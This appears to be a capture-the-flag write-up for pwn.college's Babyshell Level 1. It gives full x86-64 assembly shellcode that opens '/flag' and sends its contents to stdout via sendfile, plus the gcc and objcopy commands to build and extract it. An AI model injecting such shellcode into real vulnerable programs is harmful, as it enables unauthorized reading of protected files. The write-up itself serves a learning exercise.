# Babyshell Level 1
This is the first challenge of the shellcoding modules from pwn.college, it seems to me like a pretty simple challenge... however make sure to watch the videos on youtube before trying to complete those !

## How the challenge works
We are basically asked to "inject position independant **shell**-code", we say position independant because the challenge base address change at every execution.

From our knowledge, we know that most of the time flag is stored in "/flag", this means we can write a shellcode to read and output us this file.

I highly hope you have a great understanding of syscalls so far, if not i highly recommend you go read [The Linux Programming Interface](https://man7.org/tlpi/) and [Understanding the Linux Kernel, 3rd Edition](https://www.oreilly.com/library/view/understanding-the-linux/0596005652/).

We will highly rely on syscalls on this module since it's pretty much the only thing we have at hands, we will rely specifically on **sys_open**, **sys_sendfile** and **sys_exit**.

As it looks pretty obvious, we will first **open** the file (file descriptor), **sendfile** to read the content of that file and send its output to a file descriptor and then **exit** the program cleanly.

## Solving the Challenge
I think we're ready to start writing shellcode, for this we will write a **.s** (source) file, compile it with gcc (**gcc -nostdlib -static solve.s solve**) and extract the **.text** section code (our shellcode), into another file (**objcopy --dump-section .text=shellcode solve**).

```x86asm
.global _start
_start:
.intel_syntax noprefix
    # Open file descriptor
    mov rsi, 0                  # flags
    lea rdi, [rip+flag]         # path name
    mov rax, 2                  # syscall number (sys_open)
    syscall                     # syscall (call into kernel)

    # Read
    mov rdi, 1                  # out_fd
    mov rsi, rax                # in_fd
    mov rdx, 0                  # offset
    mov r10, 100                # count
    mov rax, 40                 # syscall (sys_sendfile)
    syscall                     # call into the kernel
    
    # Exit
    mov rax, 60                 # syscall (sys_exit)
    mov rdi, 42                 # exit number
    syscall                     # syscall
flag:
    .ascii "/flag\0"
```

Execute the program with our ./shellcode redirected to stdin and we should win this challenge :)
